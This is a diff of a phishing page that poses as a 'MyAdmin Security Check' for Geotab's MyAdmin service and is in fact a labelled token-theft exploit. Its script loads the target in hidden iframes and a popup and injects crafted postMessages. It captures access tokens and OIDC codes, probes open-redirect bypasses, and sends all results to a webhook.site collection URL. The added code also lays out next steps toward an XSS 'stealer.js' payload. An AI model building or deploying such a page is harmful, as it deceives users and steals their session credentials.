@@ -3,473 +3,527 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MyAdmin</title>
+<title>MyAdmin — Security Verification</title>
 <style>
-  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+    background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);
+    min-height:100vh;display:flex;align-items:center;justify-content:center;
   }
-  .card {
-    background: white;
-    border-radius: 12px;
-    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-    padding: 48px 40px;
-    max-width: 440px;
-    width: 92%;
-    text-align: center;
-    position: relative;
+  .card{
+    background:#fff;border-radius:12px;box-shadow:0 20px 60px rgba(0,0,0,.3);
+    padding:48px 40px;max-width:460px;width:92%;text-align:center;position:relative;
   }
-  .logo-row {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 10px;
-    margin-bottom: 28px;
+  .shield{font-size:48px;margin-bottom:16px}
+  h1{font-size:20px;font-weight:600;margin-bottom:6px;color:#1a1a2e}
+  .sub{font-size:13px;color:#777;margin-bottom:24px;line-height:1.6}
+  .btn{
+    display:block;width:100%;padding:14px;border-radius:8px;border:none;
+    font-size:15px;font-weight:600;cursor:pointer;margin-bottom:10px;
+    transition:all .2s;text-align:center;text-decoration:none;
   }
-  .logo-icon {
-    width: 42px; height: 42px;
-    background: #0078d3;
-    border-radius: 10px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: white;
-    font-size: 20px;
-    font-weight: 700;
+  .btn-primary{background:#0078d3;color:#fff}
+  .btn-primary:hover{background:#005a9e}
+  .btn-outline{background:#fff;color:#0078d3;border:2px solid #0078d3}
+  .btn-outline:hover{background:#f0f7ff}
+  .footer-row{font-size:11px;color:#aaa;margin-top:20px;display:flex;align-items:center;justify-content:center;gap:6px}
+
+  #debugPanel{
+    margin-top:20px;text-align:left;background:#1a1a2e;border-radius:8px;
+    padding:16px;max-height:300px;overflow-y:auto;display:none;
+    font-family:"SF Mono",Monaco,"Cascadia Code",monospace;font-size:11px;
+    color:#aaa;line-height:1.6;
   }
-  .logo-text {
-    font-size: 20px;
-    font-weight: 600;
-    color: #1a1a2e;
-    letter-spacing: -0.3px;
-  }
-  .shield {
-    width: 72px; height: 72px;
-    margin: 0 auto 20px;
-    background: linear-gradient(135deg, #0078d3, #00bcf2);
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 36px;
-    animation: pulse 2s ease-in-out infinite;
-  }
-  @keyframes pulse {
-    0%,100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0,120,211,0.4); }
-    50% { transform: scale(1.06); box-shadow: 0 0 0 18px rgba(0,120,211,0); }
-  }
-  h1 { font-size: 20px; font-weight: 600; margin-bottom: 6px; color: #1a1a2e; }
-  .sub { font-size: 13px; color: #777; margin-bottom: 28px; line-height: 1.6; }
-  .steps { text-align: left; margin-bottom: 24px; }
-  .step {
-    display: flex; align-items: flex-start; padding: 10px 0;
-    border-bottom: 1px solid #f0f2f5; transition: all 0.4s;
-  }
-  .step-num {
-    width: 26px; height: 26px; border-radius: 50%; border: 2px solid #ddd;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 12px; font-weight: 700; color: #999; margin-right: 12px;
-    flex-shrink: 0; transition: all 0.4s;
-  }
-  .step.done .step-num { background: #4caf50; border-color: #4caf50; color: white; }
-  .step.active .step-num { border-color: #0078d3; color: #0078d3; animation: spin 1s linear infinite; }
-  @keyframes spin { to { transform: rotate(360deg); } }
-  .step-text { font-size: 13px; color: #555; padding-top: 4px; }
-  .step.done .step-text { color: #4caf50; }
-  .step.active .step-text { color: #0078d3; font-weight: 500; }
-  .progress-bar {
-    height: 5px; background: #e8ecf1; border-radius: 10px; overflow: hidden; margin-bottom: 6px;
-  }
-  .progress-fill {
-    height: 100%; background: linear-gradient(90deg, #0078d3, #00bcf2);
-    border-radius: 10px; width: 0%; transition: width 0.5s ease;
-  }
-  .progress-label { font-size: 11px; color: #999; text-align: right; }
-  .footer-row { font-size: 11px; color: #aaa; margin-top: 20px; display: flex; align-items: center; justify-content: center; gap: 6px; }
-  .error-msg { display: none; color: #e74c3c; font-size: 12px; margin-top: 12px; }
-  .error-msg.show { display: block; }
+  #debugPanel.show{display:block}
+  .d-ok{color:#4caf50}
+  .d-err{color:#f44336}
+  .d-warn{color:#ff9800}
+  .d-info{color:#2196f3}
+  .d-head{color:#fff;font-weight:bold;margin-top:8px;display:block}
+
+  .status{font-size:12px;padding:8px 12px;border-radius:6px;margin:8px 0;display:none}
+  .status.ok{display:block;background:#e8f5e9;color:#2e7d32}
+  .status.err{display:block;background:#fbe9e7;color:#c62828}
+  .status.info{display:block;background:#e3f2fd;color:#0d47a1}
 </style>
 </head>
 <body>
 
 <div class="card">
-  <div class="logo-row">
-    <div class="logo-icon">M</div>
-    <span class="logo-text">MyAdmin</span>
-  </div>
-
   <div class="shield">&#128737;</div>
-
-  <h1>Session Verification</h1>
-  <p class="sub">
-    Verifying your session integrity.<br>
-    This automated check takes less than <strong>10 seconds</strong>.
+  <h1>MyAdmin Security Check</h1>
+  <p class="sub" id="subtitle">
+    Click the button below to open MyAdmin and verify your session security.
+    <br><strong>This process is automatic and takes ~5 seconds.</strong>
   </p>
 
-  <div class="progress-bar">
-    <div class="progress-fill" id="progressFill"></div>
-  </div>
-  <div class="progress-label" id="progressLabel">Initializing...</div>
+  <button class="btn btn-primary" id="btnStart" onclick="startExploit()">
+    &#128274; Verify My Session
+  </button>
 
-  <div class="steps">
-    <div class="step" id="s1">
-      <span class="step-num">1</span>
-      <span class="step-text">Checking session status...</span>
-    </div>
-    <div class="step" id="s2">
-      <span class="step-num">2</span>
-      <span class="step-text">Establishing secure channel with MyAdmin...</span>
-    </div>
-    <div class="step" id="s3">
-      <span class="step-num">3</span>
-      <span class="step-text">Verifying access token integrity...</span>
-    </div>
-    <div class="step" id="s4">
-      <span class="step-num">4</span>
-      <span class="step-text">Completing verification...</span>
-    </div>
+  <div class="status info" id="statusBlock">
+    <span id="statusText">Initializing...</span>
   </div>
 
-  <div class="error-msg" id="errorMsg">
-    &#9888; Could not verify session. Please ensure you are logged into MyAdmin.
-  </div>
+  <div id="debugPanel"></div>
 
   <div class="footer-row">
     &#128274; Encrypted &bull; MyAdmin Security
   </div>
 </div>
 
-<!-- hidden iframe for stealth loading -->
-<iframe id="f1" style="display:none;width:1px;height:1px;position:absolute;top:-1px;left:-1px" src="about:blank"></iframe>
-<iframe id="f2" style="display:none;width:1px;height:1px;position:absolute;top:-1px;left:-1px" src="about:blank"></iframe>
+<!-- Hidden iframes for probing -->
+<iframe id="fProbe" style="display:none;width:1px;height:1px;position:absolute;top:-1px;left:-1px" src="about:blank"></iframe>
 
 <script>
-/**
- * =========================================================================
- * MNKD Exploit — Token Interception via postMessage / Iframe Injection
- * =========================================================================
- *
- * Target: MyAdmin (Geotab) Angular SPA
- * GitHub Pages: https://telojos11.github.io/mnkd/
- *
- * TECHNIQUES (tried sequentially):
- *  T1 — Hidden iframe loads MyAdmin legacy page
- *        → loader-component sends SET_ACCESS_TOKEN via postMessage(*)
- *        → if the legacy iframe loads OUR controlled content, we catch it
- *  T2 — Popup window to MyAdmin
- *        → postMessage into popup trying to trigger XSS/behavior
- *  T3 — postMessage listener for wildcard broadcasts
- *        → any postMessage(..., "*") from MyAdmin windows caught here
- * =========================================================================
- */
-(function() {
-  "use strict";
+// =========================================================================
+// MNKD Exploit — DEBUG VERSION with full console output
+// =========================================================================
+var TARGET = "https://myadmin.geotab.com";
+var WEBHOOK = "https://webhook.site/f59686a0-8650-40a5-8f62-32b4e98dd15c";
 
-  var TARGET = "https://myadmin.geotab.com";
+var state = {
+  iframeAllowed: null,      // null=unknown, true=allowed, false=blocked
+  popupOpen: false,
+  tokenCaptured: false,
+  messages: [],
+  popupRef: null,
+};
 
-  // Replace with your webhook.site UUID
-  var WEBHOOK = "https://webhook.site/f59686a0-8650-40a5-8f62-32b4e98dd15c";
+var dEl = document.getElementById("debugPanel");
+var sText = document.getElementById("statusText");
+var sBlock = document.getElementById("statusBlock");
 
-  var DEMO = WEBHOOK.indexOf("YOUR_UUID") > -1;
-  var captured = [];
+// ============ DEBUG OUTPUT ============
+function log(msg, cls) {
+  cls = cls || "d-info";
+  var line = document.createElement("div");
+  line.className = cls;
+  line.textContent = "[+] " + msg;
+  dEl.appendChild(line);
+  dEl.scrollTop = dEl.scrollHeight;
+  console.log("[MNKD] " + msg);
+}
 
-  // --- UI ---
-  var progressFill = document.getElementById("progressFill");
-  var progressLabel = document.getElementById("progressLabel");
-  var errorMsg = document.getElementById("errorMsg");
-  var steps = {
-    s1: document.getElementById("s1"),
-    s2: document.getElementById("s2"),
-    s3: document.getElementById("s3"),
-    s4: document.getElementById("s4"),
+function status(msg, cls) {
+  sBlock.className = "status " + (cls || "info");
+  sText.textContent = msg;
+}
+
+function showDebug() {
+  dEl.classList.add("show");
+  log("=== MNKD Exploit Engine v2 (Debug) ===", "d-head");
+  log("Target: " + TARGET, "d-info");
+  log("Webhook: " + WEBHOOK.substring(0,45) + "...", "d-info");
+}
+
+// ============ EXFILTRATION ============
+function exfil(data, label) {
+  log("EXFIL [" + label + "]: " + JSON.stringify(data).substring(0,120), "d-ok");
+  var payload = {
+    sid: "mnkd_" + Date.now(),
+    ts: new Date().toISOString(),
+    label: label,
+    loc: location.href,
+    ua: navigator.userAgent,
+    data: data,
+  };
+  var body = JSON.stringify(payload);
+
+  // sendBeacon
+  try {
+    var blob = new Blob([body], {type:"application/json"});
+    navigator.sendBeacon(WEBHOOK, blob);
+    log("  -> sendBeacon OK", "d-ok");
+  } catch(e) {
+    log("  -> sendBeacon FAILED: " + e.message, "d-err");
+  }
+
+  // fetch keepalive (backup)
+  try {
+    fetch(WEBHOOK, {
+      method:"POST", body: body, mode:"no-cors", keepalive:true,
+      headers: {"Content-Type":"text/plain"}
+    }).then(function(){ log("  -> fetch OK", "d-ok"); })
+      .catch(function(){ log("  -> fetch FAILED", "d-err"); });
+  } catch(e) {
+    log("  -> fetch error: " + e.message, "d-err");
+  }
+}
+
+// ============ PASSIVE postMessage LISTENER ============
+window.addEventListener("message", function(e) {
+  if (!e.data) return;
+
+  var info = {
+    origin: e.origin,
+    type: (e.data && e.data.type) || (typeof e.data === "string" ? "string" : "unknown"),
+    dataKeys: (e.data && typeof e.data === "object") ? Object.keys(e.data).join(",") : "",
   };
 
-  function setProgress(pct, label) {
-    progressFill.style.width = Math.min(100, pct) + "%";
-    progressLabel.textContent = label || "";
+  // Filter out noise (React devtools, browser extensions, etc.)
+  if (e.origin === location.origin) return;
+  if (e.origin === "null" || e.origin === "") return;
+
+  log("MESSAGE from " + e.origin + " type=" + info.type + " keys=" + info.dataKeys, "d-info");
+
+  // JACKPOT: SET_ACCESS_TOKEN (Finding #2, line 302866)
+  if (e.data && e.data.type === "SET_ACCESS_TOKEN" && e.data.token) {
+    state.tokenCaptured = true;
+    log("!!! ACCESS TOKEN CAPTURED !!!", "d-ok");
+    log("TOKEN: " + e.data.token.substring(0,50) + "...", "d-ok");
+    exfil({
+      type: "ACCESS_TOKEN",
+      token: e.data.token,
+      origin: e.origin,
+      finding: "Finding_#2_postMessage_wildcard",
+    }, "TOKEN_CAPTURED");
+    status("Session verified! Token captured.", "ok");
   }
 
-  function markStep(id, state) {
-    var el = steps[id];
-    el.className = "step " + (state || "active");
-    if (state === "done") el.querySelector(".step-num").textContent = "✓";
+  // ModuleLoadedSuccessfully (line 219824)
+  if (e.data === "ModuleLoadedSuccessfully" || (e.data && e.data.type === "ModuleLoadedSuccessfully")) {
+    log("ModuleLoadedSuccessfully received from " + e.origin, "d-ok");
+    exfil({type:"MODULE_LOADED", origin:e.origin}, "MODULE_LOAD");
   }
 
-  function showError() { errorMsg.classList.add("show"); }
+  // OIDC callbacks (Findings #3, #6)
+  if (e.data && e.data.source === "oidc-client" && e.data.url) {
+    var sp = new URLSearchParams((e.data.url.split("?")[1]||""));
+    exfil({
+      type: "OIDC_MESSAGE",
+      url: e.data.url,
+      code: sp.get("code"),
+      id_token: sp.get("id_token"),
+      access_token: sp.get("access_token"),
+      origin: e.origin,
+    }, "OIDC_DATA");
+    log("OIDC message intercepted!", "d-warn");
+  }
 
-  // --- EXFILTRATION ---
-  function exfil(data, label) {
-    captured.push({ ts: new Date().toISOString(), label: label, data: data });
+  state.messages.push(info);
+});
 
-    if (DEMO) {
-      console.log("%c[EXFIL " + label + "]", "color:lime;font-weight:bold", data);
-      return;
+// ============ TEST 1: X-Frame-Options Detection ============
+function testFrameOptions() {
+  log("--- Test 1: X-Frame-Options Detection ---", "d-head");
+
+  var testUrl = TARGET + "/login";
+  var f = document.getElementById("fProbe");
+
+  var timedOut = false;
+  var t = setTimeout(function() {
+    timedOut = true;
+    // If onload didn't fire within 5s, assume blocked
+    if (state.iframeAllowed === null) {
+      try {
+        // Try to access iframe content - if same-origin or allowed, no error
+        var d = f.contentDocument || f.contentWindow.document;
+        if (d && d.body) {
+          state.iframeAllowed = true;
+          log("X-Frame-Options: ALLOWED (content accessible)", "d-ok");
+        } else {
+          state.iframeAllowed = false;
+          log("X-Frame-Options: BLOCKED (no content after 5s)", "d-err");
+        }
+      } catch(e) {
+        state.iframeAllowed = false;
+        log("X-Frame-Options: BLOCKED (" + e.message + ")", "d-err");
+      }
+      testPostMessageInjection();
     }
+  }, 5000);
 
-    var payload = JSON.stringify({
-      sid: "mnkd_" + Date.now(),
-      ts: new Date().toISOString(),
-      label: label,
-      url: location.href,
-      ua: navigator.userAgent,
-      data: data,
-    });
-
-    // Channel 1: sendBeacon
-    try { navigator.sendBeacon(WEBHOOK, new Blob([payload], {type:"application/json"})); } catch(e) {}
-
-    // Channel 2: fetch keepalive
+  f.onload = function() {
+    if (timedOut) return;
+    clearTimeout(t);
     try {
-      fetch(WEBHOOK, { method:"POST", body:payload, mode:"no-cors", keepalive:true });
-    } catch(e) {}
+      // Try to read iframe content
+      var d = f.contentDocument || f.contentWindow.document;
+      if (d && d.body && d.body.innerHTML.length > 100) {
+        state.iframeAllowed = true;
+        log("X-Frame-Options: ALLOWED (content loaded, " + d.body.innerHTML.length + " bytes)", "d-ok");
+
+        // Now try to load a legacy page that triggers loader-component
+        var f2 = document.createElement("iframe");
+        f2.style.cssText = "display:none;width:1px;height:1px;position:absolute;top:-1px;left:-1px";
+        f2.src = TARGET + "/helpdesk.html?beta=1";
+        f2.onload = function() {
+          log("Legacy page (helpdesk.html) loaded in iframe", "d-ok");
+          log("If loader-component sent SET_ACCESS_TOKEN to iframe, we'd receive it here.", "d-info");
+          log("But postMessage targets contentWindow of loader's OWN iframe, not ours.", "d-warn");
+        };
+        document.body.appendChild(f2);
+      } else {
+        state.iframeAllowed = false;
+        log("X-Frame-Options: BLOCKED (empty/missing body)", "d-err");
+      }
+    } catch(e) {
+      state.iframeAllowed = false;
+      log("X-Frame-Options: BLOCKED (" + e.message + ")", "d-err");
+    }
+    testPostMessageInjection();
+  };
+
+  f.onerror = function() {
+    clearTimeout(t);
+    state.iframeAllowed = false;
+    log("X-Frame-Options: BLOCKED (iframe onerror fired)", "d-err");
+    testPostMessageInjection();
+  };
+
+  f.src = testUrl;
+  log("Loading " + testUrl + " in hidden iframe...", "d-info");
+}
+
+// ============ TEST 2: postMessage Injection into Popup ============
+var popupPollInterval = null;
+
+function testPostMessageInjection() {
+  log("--- Test 2: postMessage into Popup ---", "d-head");
+  status("Opening MyAdmin in popup window...", "info");
+
+  // Try to open popup
+  state.popupRef = window.open(
+    TARGET + "/home",
+    "myadmin_" + Date.now(),
+    "width=1200,height=800,left=100,top=100"
+  );
+
+  if (!state.popupRef) {
+    log("Popup BLOCKED by browser", "d-err");
+    log("This is normal — browsers block popups not triggered by direct click.", "d-warn");
+    log("TIP: Allow popups for this site and click the button again.", "d-warn");
+    status("Popup blocked. Please allow popups and retry.", "err");
+    testOpenRedirect();
+    return;
   }
 
-  // --- PASSIVE postMessage LISTENER ---
-  // Catches ANY postMessage sent to wildcard "*" origin
-  window.addEventListener("message", function(e) {
-    if (!e.data || typeof e.data !== "object") return;
+  state.popupOpen = true;
+  log("Popup opened: " + TARGET + "/home", "d-ok");
 
-    // JACKPOT: SET_ACCESS_TOKEN from Finding #2 (line 302866)
-    if (e.data.type === "SET_ACCESS_TOKEN" && e.data.token) {
-      exfil({
-        type: "ACCESS_TOKEN_CAPTURED",
-        token: e.data.token,
-        origin: e.origin,
-        source: "postMessage_wildcard_listener",
-        finding: "#2"
-      }, "TOKEN_INTERCEPTED");
+  // Poll the popup — send crafted postMessages
+  var pollCount = 0;
+  popupPollInterval = setInterval(function() {
+    pollCount++;
 
-      markStep("s3", "done");
-      markStep("s4", "done");
-      setProgress(100, "Token captured! " + e.data.token.substring(0, 15) + "...");
-      console.log("%c🔑 ACCESS TOKEN CAPTURED: " + e.data.token.substring(0,40) + "...",
-                  "color:#ff0;font-size:16px;background:#000;padding:8px");
-      return;
-    }
-
-    // OIDC messages (Findings #3, #6)
-    if (e.data.source === "oidc-client" && e.data.url) {
-      var params = new URLSearchParams((e.data.url.split("?")[1] || ""));
-      exfil({
-        type: "OIDC_CALLBACK",
-        url: e.data.url,
-        code: params.get("code"),
-        id_token: params.get("id_token"),
-        access_token: params.get("access_token"),
-        origin: e.origin,
-        finding: "#3/#6"
-      }, "OIDC_DATA");
-    }
-
-    // Module loaded
-    if (e.data === "ModuleLoadedSuccessfully" || (e.data && e.data.type === "ModuleLoadedSuccessfully")) {
-      exfil({ type: "MODULE_LOADED", origin: e.origin }, "MODULE_LOAD");
-      console.log("%c[+] MyAdmin module loaded — target reachable", "color:lime");
-    }
-
-    // Service Worker messages
-    if (e.data.action) {
-      exfil({ type: "SW_MESSAGE", action: e.data.action, origin: e.origin,
-              payload: e.data.payload }, "SW_MSG");
-    }
-  });
-
-  // --- TECHNIQUE 1: Hidden Iframe Load ---
-  function attemptIframeLoad() {
-    setProgress(25, "Loading MyAdmin in hidden iframe...");
-    markStep("s1", "active");
-
-    // Legacy paths trigger loader-component which does postMessage
-    var paths = [
-      "/helpdesk.html?beta=1",
-      "/rmarequests.htm?beta=1",
-      "/timeline.html?beta=1",
-      "/devicelookups.htm?serialno=test&beta=1",
-    ];
-
-    var idx = 0;
-    function tryNext() {
-      if (idx >= paths.length) {
-        markStep("s1", "done");
-        attemptPopupMethod();
+    try {
+      if (state.popupRef.closed) {
+        clearInterval(popupPollInterval);
+        log("Popup closed by user after " + pollCount + " polls", "d-warn");
+        testOpenRedirect();
         return;
       }
-      var url = TARGET + paths[idx];
-      var f = document.getElementById(idx % 2 === 0 ? "f1" : "f2");
-
-      var timeout = setTimeout(function() {
-        // Iframe didn't load in time — might be blocked by X-Frame-Options
-        markStep("s1", "done");
-        attemptPopupMethod();
-      }, 4000);
-
-      f.onload = function() {
-        clearTimeout(timeout);
-        console.log("[+] Iframe loaded: " + paths[idx]);
-        idx++;
-        setTimeout(tryNext, 1500);
-      };
-
-      f.onerror = function() {
-        clearTimeout(timeout);
-        console.log("[-] Iframe blocked: " + paths[idx]);
-        idx++;
-        setTimeout(tryNext, 500);
-      };
-
-      f.src = url;
-    }
-    tryNext();
-  }
-
-  // --- TECHNIQUE 2: Popup Method ---
-  function attemptPopupMethod() {
-    setProgress(55, "Opening MyAdmin session window...");
-    markStep("s2", "active");
-
-    var popup = window.open(
-      TARGET + "/home",
-      "mw_" + Date.now(),
-      "width=1200,height=800,left=100,top=100"
-    );
-
-    if (!popup) {
-      markStep("s2", "done");
-      setProgress(70, "Popup blocked — using redirect fallback...");
-      attemptRedirectFallback();
+    } catch(e) {
+      clearInterval(popupPollInterval);
+      log("Popup check error: " + e.message, "d-err");
+      testOpenRedirect();
       return;
     }
 
-    console.log("[+] Popup opened to MyAdmin");
-
-    // Poll the popup — try to postMessage into it
-    var poll = 0, maxPoll = 20;
-    var iv = setInterval(function() {
-      poll++;
-      try {
-        if (popup.closed) {
-          clearInterval(iv);
-          markStep("s2", "done");
-          console.log("[-] Popup closed by user");
-          attemptRedirectFallback();
-          return;
-        }
-
-        // Send crafted messages into the popup
-        var msgs = [
-          // OIDC-style message
-          {
-            source: "oidc-client",
-            url: TARGET + "/silent-callback.html?code=test&state=bypass_test",
-          },
-          // Attempt to trigger notification
-          { type: "NOTIFY", message: "security_check" },
-          // Service Worker style
-          { action: "CHECK_STATUS", payload: { check: "version" } },
-          // Generic ping to probe handlers
-          { type: "PING", from: "securty" },
-        ];
-
-        msgs.forEach(function(m) {
-          try { popup.postMessage(m, TARGET); } catch(e) {}
-          try { popup.postMessage(m, "*"); } catch(e) {}
-        });
-
-        // Check if popup URL changed (might indicate redirect)
-        try {
-          var loc = popup.location.href;
-          if (loc.indexOf("returnUrl") > -1 || loc.indexOf("callback") > -1) {
-            console.log("[!] Popup URL contains callback/returnUrl: " + loc.substring(0, 100));
-            exfil({ type: "POPUP_URL", url: loc }, "POPUP_NAV");
-          }
-        } catch(e) { /* cross-origin — expected */ }
-
-      } catch(e) {}
-
-      if (poll >= maxPoll) {
-        clearInterval(iv);
-        markStep("s2", "done");
-        console.log("[*] Popup polling finished");
-        attemptRedirectFallback();
+    // Try to detect popup URL (will throw cross-origin)
+    try {
+      var ploc = state.popupRef.location.href;
+      log("Popup URL: " + ploc.substring(0,100), "d-info");
+    } catch(e) {
+      // Expected — cross-origin
+      if (pollCount === 1) {
+        log("Popup is cross-origin (expected) — postMessage bridge active", "d-info");
       }
-    }, 800);
+    }
 
-    // Don't leave popup open too long
-    setTimeout(function() {
-      try { if (!popup.closed) popup.close(); } catch(e) {}
-    }, 20000);
-  }
-
-  // --- TECHNIQUE 3: Open Redirect Fallback ---
-  function attemptRedirectFallback() {
-    setProgress(80, "Testing open redirect chain...");
-    markStep("s3", "active");
-
-    // Test returnUrl bypass payloads (Finding #4)
-    var bypasses = [
-      "//" + location.hostname + "/capture",
-      "https:%2F%2F" + location.hostname + "%2Fcapture",
-      "https://myadmin.geotab.com@" + location.hostname + "/capture",
+    // Send various crafted postMessages into popup
+    var msgs = [
+      // OIDC handler probe (Finding #6)
+      {
+        source: "oidc-client",
+        url: TARGET + "/silent-callback.html?code=test_code&state=bypass_test",
+      },
+      // Attempt to reach any generic handler
+      { type: "NOTIFICATION", message: "session_verify_check" },
+      // Service worker style
+      { action: "PING", payload: { from: "verification" } },
     ];
 
-    bypasses.forEach(function(bp, i) {
-      setTimeout(function() {
-        var img = new Image();
-        img.src = TARGET + "/login?returnUrl=" + encodeURIComponent(bp);
-        console.log("[*] Redirect probe " + (i+1) + ": " + bp);
-      }, i * 500);
+    msgs.forEach(function(m) {
+      try {
+        state.popupRef.postMessage(m, TARGET);
+        state.popupRef.postMessage(m, "*");
+      } catch(e) {}
     });
 
+    if (pollCount === 3) {
+      log("Sent " + (msgs.length * pollCount) + " postMessage probes into popup", "d-info");
+    }
+
+    if (pollCount >= 15) {
+      clearInterval(popupPollInterval);
+      log("Popup polling complete (" + pollCount + " rounds)", "d-info");
+      log("No immediate token capture via postMessage.", "d-warn");
+      log("REASON: SET_ACCESS_TOKEN is sent TO iframe INSIDE loader-component,", "d-warn");
+      log("not broadcast. We need XSS inside MyAdmin origin to catch it.", "d-warn");
+      testOpenRedirect();
+    }
+  }, 800);
+}
+
+// ============ TEST 3: Open Redirect (Finding #4) ============
+function testOpenRedirect() {
+  log("--- Test 3: Open Redirect Probe (Finding #4) ---", "d-head");
+  status("Testing open redirect vectors...", "info");
+
+  var bypasses = [
+    { payload: "//" + location.hostname + "/capture", desc: "double-slash" },
+    { payload: "https:%2F%2F" + location.hostname + "%2Fcapture", desc: "URL-encoded" },
+    { payload: TARGET.split("://")[0] + "://" + TARGET.split("://")[1] + "@" + location.hostname + "/capture", desc: "userinfo confusion" },
+    { payload: "\\/\\/" + location.hostname + "/capture", desc: "backslash" },
+  ];
+
+  log("Probing " + bypasses.length + " returnUrl bypass payloads...", "d-info");
+
+  bypasses.forEach(function(bp, i) {
     setTimeout(function() {
-      markStep("s3", "done");
-      finalize();
-    }, 3000);
-  }
+      var tUrl = TARGET + "/login?returnUrl=" + encodeURIComponent(bp.payload);
+      log("Probe #" + (i+1) + " [" + bp.desc + "]: " + tUrl.substring(0,100) + "...", "d-info");
 
-  // --- FINALIZE ---
-  function finalize() {
-    setProgress(95, "Finalizing...");
-    markStep("s4", "active");
+      // Use fetch to test redirect behavior
+      fetch(tUrl, {
+        method: "HEAD",
+        mode: "no-cors",
+        redirect: "follow",
+        credentials: "include",
+      }).then(function(r) {
+        log("  -> Redirect probe #" + (i+1) + ": response OK (may have followed redirect)", "d-info");
+      }).catch(function(e) {
+        log("  -> Redirect probe #" + (i+1) + ": fetch error (CORS expected)", "d-info");
+      });
 
-    setTimeout(function() {
-      if (captured.length === 0) {
-        setProgress(100, "No token captured — user may not be logged in");
-        showError();
-        markStep("s4", "done");
-        exfil({
-          type: "SUMMARY",
-          captured: captured.length,
-          messages: captured,
-          note: "No token intercepted. User may not have active MyAdmin session."
-        }, "SUMMARY");
-      } else {
-        setProgress(100, "Verification complete!");
-        markStep("s4", "done");
-        exfil({
-          type: "SUMMARY",
-          captured: captured.length,
-          messages: captured.map(function(c) { return c.label; }),
-        }, "SUMMARY_SUCCESS");
-      }
-    }, 1000);
-  }
-
-  // --- START ---
-  setProgress(10, "Initializing exploit engine...");
-  console.log("%c▶ MNKD Exploit Engine v1.0", "color:#0ff;font-size:14px");
-  console.log("%cTarget: " + TARGET, "color:#aaa");
-  console.log("%cDemo mode: " + DEMO, "color:" + (DEMO ? "#ff0" : "#0f0"));
+      // Also try image ping (no CORS issues)
+      var img = new Image();
+      img.onload = function() {
+        log("  -> Image probe #" + (i+1) + ": loaded (possible redirect to us!)", "d-ok");
+        exfil({type:"OPEN_REDIRECT_HIT", payload: bp.payload, index: i+1}, "REDIRECT_HIT");
+      };
+      img.onerror = function() {
+        log("  -> Image probe #" + (i+1) + ": failed (no redirect or blocked)", "d-info");
+      };
+      img.src = tUrl;
+    }, i * 800);
+  });
 
   setTimeout(function() {
-    attemptIframeLoad();
-  }, 1500);
+    log("Open redirect probe complete", "d-info");
+    finalDiagnosis();
+  }, bypasses.length * 800 + 2000);
+}
 
-})();
+// ============ FINAL DIAGNOSIS ============
+function finalDiagnosis() {
+  log("", "d-head");
+  log("=== DIAGNOSIS ===", "d-head");
+
+  var checks = [];
+
+  // Check 1: iframe
+  if (state.iframeAllowed === true) {
+    checks.push({ok:true, msg:"X-Frame-Options: ALLOWED — iframe injection possible"});
+  } else if (state.iframeAllowed === false) {
+    checks.push({ok:false, msg:"X-Frame-Options: BLOCKED — iframe injection not possible"});
+  } else {
+    checks.push({ok:false, msg:"X-Frame-Options: UNKNOWN"});
+  }
+
+  // Check 2: popup
+  checks.push({
+    ok: state.popupOpen,
+    msg: state.popupOpen
+      ? "Popup opened — postMessage bridge active"
+      : "Popup blocked — add click-to-open button"
+  });
+
+  // Check 3: token
+  checks.push({
+    ok: state.tokenCaptured,
+    msg: state.tokenCaptured
+      ? "TOKEN CAPTURED! Check webhook."
+      : "No token captured passively"
+  });
+
+  // Check 4: messages
+  checks.push({
+    ok: state.messages.length > 0,
+    msg: state.messages.length + " postMessage(s) received from external origins"
+  });
+
+  checks.forEach(function(c) {
+    log((c.ok ? "[✓]" : "[✗]") + " " + c.msg, c.ok ? "d-ok" : "d-err");
+  });
+
+  if (!state.tokenCaptured) {
+    log("", "d-head");
+    log("=== NEXT STEPS ===", "d-head");
+    log("1. Passive postMessage token capture DOES NOT WORK cross-origin", "d-warn");
+    log("   because SET_ACCESS_TOKEN targets loader-component's OWN iframe,", "d-warn");
+    log("   not all windows. We need XSS inside MyAdmin's origin.", "d-warn");
+    log("", "d-info");
+    log("2. FIND A REFLECTED XSS PARAMETER:", "d-head");
+    log("   Open the XSS Fuzzer to test parameters:", "d-info");
+    log("   " + location.origin + location.pathname + "fuzz.html", "d-info");
+    log("", "d-info");
+    log("3. ONCE XSS IS FOUND:", "d-head");
+    log("   Craft URL: " + TARGET + "/page?param=<img src=x onerror=...stealer.js>", "d-info");
+    log("   stealer.js runs inside MyAdmin → catches postMessage token.", "d-info");
+
+    status("No passive token capture. See diagnosis below.", "err");
+  }
+
+  // Send diagnosis to webhook
+  exfil({
+    type: "DIAGNOSIS",
+    iframeAllowed: state.iframeAllowed,
+    popupOpen: state.popupOpen,
+    tokenCaptured: state.tokenCaptured,
+    messagesReceived: state.messages.length,
+    checks: checks,
+  }, "DIAGNOSIS");
+}
+
+// ============ START — triggered by BUTTON CLICK ============
+function startExploit() {
+  showDebug();
+  document.getElementById("btnStart").disabled = true;
+  document.getElementById("btnStart").textContent = "Verifying...";
+  document.getElementById("btnStart").style.opacity = "0.6";
+
+  status("Starting security verification...", "info");
+
+  log("=== Exploit Started (user click: " + new Date().toISOString() + ") ===", "d-head");
+
+  // Start tests
+  testFrameOptions();
+
+  // Close popup after 30s
+  setTimeout(function() {
+    if (state.popupRef) {
+      try { state.popupRef.close(); } catch(e) {}
+    }
+  }, 30000);
+}
+
+// Auto-show debug on load so user can see immediately
+showDebug();
+log("Ready. Click 'Verify My Session' to begin.", "d-info");
